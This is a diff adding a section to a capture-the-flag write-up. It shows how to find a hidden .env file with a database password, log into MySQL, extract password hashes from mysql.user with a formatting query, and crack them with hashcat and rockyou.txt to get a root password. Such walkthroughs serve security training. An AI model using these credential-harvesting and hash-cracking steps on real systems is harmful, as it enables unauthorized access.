@@ -151,6 +151,61 @@ now that we confirmed that username "clarice" and password "passwordfromfile" ca
 by listing the files and folders we can see that there is a file called "flag5.txt" and that's where our flag is located.
 ![flag 5](<flag 5-1.png>)
 
+by listing hidden files and directories, we see that there is a file called '.env'. this file is very important as it normally has some credential information about mysql service running.
+
+and as expected it  has dbpassword.
+
+now try to login to mysql server
+
+-> mysql -u clock_user -p <passwordgot>
+
+now that we have successfully logged in, run these commands also:
+
+->show databases;
+->use mysql;
+->select * from  user;
+
+as you can see it looks like it is gibberish.
+
+in order to better understand it, use the following command:
+
+-> SELECT `user`, CONCAT('$mysql', LEFT(authentication_string, 6), '*', INSERT(HEX(SUBSTR(authentication_string, 8)), 41, 0, '*')) AS hash 
+FROM mysql.user 
+WHERE plugin = 'caching_sha2_password' 
+AND authentication_string NOT LIKE '%INVALIDSALTANDPASSWORD%' 
+AND authentication_string != '';
+
+
+this will help to make hashes more comprehensible and easy to understand.
+
+Now we need to copy each hash and provide the same to hashcat tool to crack them using the following command:
+
+->hashcat -m 7401 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -O –session hash.txt
+
+Here the hash mode is MySQL SHA256 hash. After a few minutes, we will find that one of the provided hash is cracked and we can see the clear text password using the following command:
+
+->hashcat -m 7401 –show hash.txt
+
+![password for root](<password for flag 6-1.png>)
+
+
+now that we have password for root,  we will login.
+
+i will let you find flag 6 on your own 🤣.
+
+
+
+Conclusion: the purpose of this room was to look at ways to compromise a linux webserver using different tools like hydra, hashcat, nmap and gobuster among others.
+
+there is also an interesting concept learn. which is "tokenization".
+
+
+
+
+
+
+
+
 
 
 
